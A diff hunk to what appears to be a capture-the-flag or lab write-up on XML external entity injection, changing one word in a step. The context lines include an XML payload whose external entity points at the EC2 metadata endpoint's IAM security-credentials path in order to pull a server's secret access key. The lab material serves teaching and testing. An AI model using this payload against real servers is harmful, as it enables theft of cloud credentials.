@@ -50,7 +50,7 @@ Retrieve the server's IAM secret access key from the EC2 metadata endpoint.
 * Server's Response:<br/>
   ![response3](https://user-images.githubusercontent.com/101610095/221720300-fd110559-5019-451d-b854-58d2b7efebb7.png)
 * As you can see, we got in the response a folder called ```security-credentials``` which will most likely contain the server's IAM secret access key.
-* Let's modify our payload and send the request: 
+* Let's update our payload and send the request: 
 ```XML
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
